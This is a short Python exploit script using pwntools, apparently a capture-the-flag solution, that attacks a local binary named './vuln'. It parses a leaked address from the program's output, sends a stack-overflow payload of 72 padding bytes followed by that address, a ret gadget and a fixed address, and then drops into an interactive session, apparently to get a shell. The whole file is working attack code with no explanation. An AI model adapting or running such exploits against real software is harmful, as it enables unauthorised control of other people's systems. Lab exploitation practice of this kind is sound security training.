from pwn import *

r = process('./vuln')

address = r.recvline().decode().split(':')[-1].strip()
print(address)

address = int(address, 16)
ret_gadget = 0x401919
offset = 72
payload = offset * b'A' +  p64(address) + p64(ret_gadget) + p64(0x470b30)

r.sendline(payload)
r.interactive()